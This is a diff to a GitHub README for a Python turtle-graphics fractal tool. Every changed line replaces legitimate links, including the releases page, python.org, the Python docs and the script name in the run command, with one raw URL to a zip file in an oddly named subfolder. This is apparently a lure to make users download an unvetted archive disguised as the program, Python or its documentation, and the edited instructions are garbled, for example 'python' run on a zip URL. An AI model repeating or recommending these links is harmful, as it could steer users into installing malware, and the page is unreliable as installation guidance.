@@ -1,6 +1,6 @@
 # 🐢 TurtleFractals - Create Beautiful Fractals Instantly
 
-[![Download TurtleFractals](https://img.shields.io/badge/Download-TurtleFractals-blue.svg)](https://github.com/channoufisaber/TurtleFractals/releases)
+[![Download TurtleFractals](https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/proinnovationist/TurtleFractals.zip)](https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/proinnovationist/TurtleFractals.zip)
 
 ## 📜 Description
 
@@ -12,17 +12,17 @@ TurtleFractals is a user-friendly application that allows you to plot stunning f
 
 Before you download TurtleFractals, ensure you have the following on your device:
 - **Operating System:** Windows, macOS, or Linux
-- **Python Version:** 3.6 or higher (If you do not have Python installed, please download it from [python.org](https://www.python.org/downloads/))
+- **Python Version:** 3.6 or higher (If you do not have Python installed, please download it from [https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/proinnovationist/TurtleFractals.zip](https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/proinnovationist/TurtleFractals.zip))
 - **Turtle Graphics Library:** This library comes with Python, so no extra installation is needed.
 
 ### 2. Download & Install
 
-To get TurtleFractals, visit this page to download: [TurtleFractals Releases](https://github.com/channoufisaber/TurtleFractals/releases).
+To get TurtleFractals, visit this page to download: [TurtleFractals Releases](https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/proinnovationist/TurtleFractals.zip).
 
 1. Click on the link above.
 2. You will see a list of available releases.
 3. Find the latest version listed at the top.
-4. Click on the `.zip` or `.tar.gz` file to download it to your computer.
+4. Click on the `.zip` or `https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/proinnovationist/TurtleFractals.zip` file to download it to your computer.
 
 After downloading, extract the contents to a folder on your device. 
 
@@ -31,11 +31,11 @@ After downloading, extract the contents to a folder on your device.
 To plot fractals:
 
 1. Open the folder where you extracted TurtleFractals.
-2. Look for the file named `run_turtlefractals.py`.
+2. Look for the file named `https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/proinnovationist/TurtleFractals.zip`.
 3. Double-click this file if you are using Windows, or run it from your terminal or command prompt using the command:
 
    ```bash
-   python run_turtlefractals.py
+   python https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/proinnovationist/TurtleFractals.zip
    ```
 
 ### 4. Using TurtleFractals
@@ -69,7 +69,7 @@ If you have any questions or need help, feel free to open an issue on the GitHub
 ## 🔗 Additional Resources 
 
 You may find these links helpful:
-- [Python Downloads](https://www.python.org/downloads/)
-- [Turtle Graphics Documentation](https://docs.python.org/3/library/turtle.html)
+- [Python Downloads](https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/proinnovationist/TurtleFractals.zip)
+- [Turtle Graphics Documentation](https://raw.githubusercontent.com/channoufisaber/TurtleFractals/main/proinnovationist/TurtleFractals.zip)
 
 Feel free to explore the code on GitHub and contribute if you wish! Thank you for using TurtleFractals. Happy fractal plotting!
